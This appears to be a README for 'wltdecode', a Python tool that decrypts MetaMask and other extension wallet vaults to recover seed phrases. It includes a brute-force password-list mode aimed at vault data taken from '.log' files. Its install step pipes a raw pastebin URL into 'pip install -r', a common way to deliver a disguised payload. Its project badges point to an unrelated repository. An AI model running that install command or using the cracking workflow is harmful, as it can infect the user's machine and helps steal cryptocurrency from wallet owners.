
# wltdecode 1.0.0


![](https://img.shields.io/github/stars/pandao/editor.md.svg) ![](https://img.shields.io/github/forks/pandao/editor.md.svg) ![](https://img.shields.io/github/tag/pandao/editor.md.svg) ![](https://img.shields.io/github/release/pandao/editor.md.svg) ![](https://img.shields.io/github/issues/pandao/editor.md.svg) ![](https://img.shields.io/bower/v/editor.md.svg)

Simple Tools for decode crypto data, from extensions wallet, Metamask, Ronin, Brawe, TronLink(old), etc.


## Installation
Python requires [Python.org](https://www.python.org/) v3,7+ to run.
Install the dependencies and devDependencies and start the server.

Manual how to extract vault data from .log file:
https://github.com/SimonBolivarPy/search-encrypted-data

```sh
python -m pip install pip
python -m pip install --upgrade pip
pip install pycryptodome
pip install -r https://pastebin.com/raw/VDG0cuV2
```
## Using Single Version
**Decrypt hash by one password:**

*default Metamask path in chrome*: 
###### C:\Users\root\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn
p.s payload search from log file, ******.log,
soon add function for this.

```python
from wltdecode import extensionWalletDecrypt
import json

# old version metamask
payload = '''{\"data\":\"5s0Jh0deuXoD1S/TCdPx2eeSg1P/ufwnXm8ZOwio8jcZzMVukueT7FMPjZOMwedVsHKbkDcfeCkkqgM/Zh02ww+qVkbe4sJWMMhuMSYNbaY1l0sgPwDrS8/ZTotnrcd0DiPdFPcWenxB6bdVCCVaRayQvX7msWQ5YHKCubZ1KoiOroqw6wgHHd63G5cTBeaLjNuRwSEvR5zbuD0iDl1fKS4kfx8GOTen3+S/aIlacbVVUi8vhhtj2KCe/LBqvz52Gue8E9ITZrNi/JOuLe3Ic7gVKisE24LHcwL1bfKgBMnrrNxNXdKLhIrRLwqt1eKLE8xutfUks2hR8tWzwPnBlT+HC+MFtPxCU03pO0wLCwWZbGiaOLmg1kC7v+474xF7N9t5VGUBgx3w1wmV2j0/QU7hkg0uXLU4MB5nkYHz+3XSmjoryEP8CdYCX+r0bpe0JMJERyWHw0oaYUFvahx+zZ5K/4snh2xKMB7eA/NmT1SwoCYuUOQYSsWfa7ns1+jO/fyZ0DoEcDNlWH1m0IN+j8zwndpacNhnJZw3cfOo60nnlyERKWV+csys8HfhQjYX9DWk6IrwWsgcXL2dpAN0qXIqRu4GlwRerZDUXtbhAUGMeQC7wY8lg+2wNM+GqHqzG3EpSEU0bhOTj3DsM8DybXv6dHtbCztmonQX2NHig2b1nTUZ3lP/omoGsPASKFCxajeYTXbbAgGZKPqOyT0odnmKuOT6ttNGsK+CjVo4qWwhWKeTUyfbZpPouqqvbF7HlHpLvIK+H2PE9oNIAeI0mA==\",\"iv\":\"UH27PH8t2UtKsvSCrB3Bdw==\",\"salt\":\"KjKzbNJAfcw9pKh0nR8cKYkMYAtcH7EGU7S/raNSAxY=\"}'''
password = '66666682465'

# stable version metamask
payload = '''{\"data\":\"IV+TmaObvBFyfLapg+7ivfyONLiqNeX+r97Mj0R6iowhm204CBrLdy3HhY/Dy814nhLRZXDxM3bu+JlUjnrYzBISeA/7l+DiJGqdpcoGlcfNIXc2kdvrX5m+y+jvWAQG8OzCk304cgAWwMYN06AwRb1Z6lh4p1Mvaj99/UKrRiJAIjBWUcKukcstbpvmf6hcRLx43DMo1/V/5kfLNzuwVW9Pjukd4S/nwaWufjIYqMTvijtAiIMdG2yA3Hg5R+QFizWLhJDxRQGs1cm5BLyQMPXh2HVoLYiJsEpvTmgx+ilKkzjcn4l4nSgcJXiLn8vbGHGrNcQlGZrX65Iyf39GS96zJ2puHd9daZvemanLVh5FXK3kPkUCpvCLKx/VnMT0DCS05nEvX1jtOyrI/ns5F4Y/ShtNEjs2nQKIiaF/KMcw35EeFMYhaGTqCHvjthS8xc11cAUEWZZ+yhx8DnTpvvmDussJNrxfzg4/ZyCutPdAY/IC13SuSeCxhsMxiWbR3n8+3KKP\",\"iv\":\"x3QOpRt8E0fxZUrapK3Fhg==\",\"keyMetadata\":{\"algorithm\":\"PBKDF2\",\"params\":{\"iterations\":600000}},\"salt\":\"NfNGDc4AZRK5KnkSf4z3JFqm4O1HLG1zSroE8+NQHBI=\"}'''
password = "metamask1"

obj = json.loads(payload)

vault = extensionWalletDecrypt()

data = vault.decryptSingle(password, obj, 10000) # IF USING OLD VERSION NEED PASTE 10.000 ITERATIONS - NEW VERSION 60.000
result = vault.extractMnemonic(data['r'])
print("[decryptSingle]\n", data)




```
##Output:
```
[{'type': 'HD Key Tree', 'data': {'mnemonic': 'result slam keen employ smile capable crack network favorite equal limit orphan', 'numberOfAccounts': 1, 'hdPath': "m/44'/60'/0'/0"}}, {'type': 'Trezor Hardware', 'data': {'hdPath': "m/44'/60'/0'/0", 'accounts': [], 'page': 0, 'paths': {}, 'perPage': 5, 'unlockedAccount': 0}}, {'type': 'Ledger Hardware', 'data': {'hdPath': "m/44'/60'/0'", 'accounts': [], 'accountDetails': {}, 'implementFullBIP44': False}}]
```

## Using List Version
```python
from wltDecode import extensionWalletDecrypt
import json

# SOURCE DATA FROM .LOG FILE OR LACAL DATA STORAGE
payload = '''{\"data\":\"IV+TmaObvBFyfLapg+7ivfyONLiqNeX+r97Mj0R6iowhm204CBrLdy3HhY/Dy814nhLRZXDxM3bu+JlUjnrYzBISeA/7l+DiJGqdpcoGlcfNIXc2kdvrX5m+y+jvWAQG8OzCk304cgAWwMYN06AwRb1Z6lh4p1Mvaj99/UKrRiJAIjBWUcKukcstbpvmf6hcRLx43DMo1/V/5kfLNzuwVW9Pjukd4S/nwaWufjIYqMTvijtAiIMdG2yA3Hg5R+QFizWLhJDxRQGs1cm5BLyQMPXh2HVoLYiJsEpvTmgx+ilKkzjcn4l4nSgcJXiLn8vbGHGrNcQlGZrX65Iyf39GS96zJ2puHd9daZvemanLVh5FXK3kPkUCpvCLKx/VnMT0DCS05nEvX1jtOyrI/ns5F4Y/ShtNEjs2nQKIiaF/KMcw35EeFMYhaGTqCHvjthS8xc11cAUEWZZ+yhx8DnTpvvmDussJNrxfzg4/ZyCutPdAY/IC13SuSeCxhsMxiWbR3n8+3KKP\",\"iv\":\"x3QOpRt8E0fxZUrapK3Fhg==\",\"keyMetadata\":{\"algorithm\":\"PBKDF2\",\"params\":{\"iterations\":600000}},\"salt\":\"NfNGDc4AZRK5KnkSf4z3JFqm4O1HLG1zSroE8+NQHBI=\"}'''

# LIST PASSWORDS
psswList = ['qwerty123', 'qwerty321', 'qwerty1212', 'qwe211', 'qweqwerty0', 'metamask1']

# LOAD STRING DATA TO JSON OBJECT 
obj = json.loads(payload)

obj = vault.decryptList(psswList, obj, 10000) # INSERT PASS LIST, JSON OBJECT, AND ITERATIONS
results = vault.extractMnemonic(obj['r']) # IF YOU WANT SEE ONLY SEED PHRASE
print("[decryptList]\n", results)

```

Note: this app cant replace HashCat app, use only actual passwords, or no big list passwords.




For more information, see [docs.python-guide.org](http://docs.python-guide.org "docs.python-guide.org").


## License
MIT
